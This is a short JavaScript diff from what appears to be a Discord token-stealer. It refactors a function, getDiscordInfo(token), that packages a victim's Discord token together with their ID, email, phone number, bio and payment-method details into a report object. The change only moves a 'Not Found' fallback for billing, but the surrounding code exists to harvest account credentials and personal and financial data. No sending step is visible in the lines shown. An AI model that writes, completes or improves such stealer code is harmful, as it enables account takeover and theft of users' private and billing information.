@@ -204,9 +204,7 @@ let getDiscordInfo = (token) => {
     if (source.email)
       p += emojis.user.payments[1];
   });
-  if (!p) {
-    p = "Not Found";
-  }; const info = {
+  const info = {
     token: token,
     ID: user.id,
     globalName: `${user.global_name}`,
@@ -230,7 +228,7 @@ let getDiscordInfo = (token) => {
     bio: user.bio || "Bio Not Found",
     phone: user.phone || "Phone Not Found",
     mail: user.email,
-    billing: p,
+    billing: !p ? "Not Found" : p,
     langue: getLanguage(settings.locale),
     status: getStatusEmoji(settings.status),
     theme: getTheme(settings.theme),
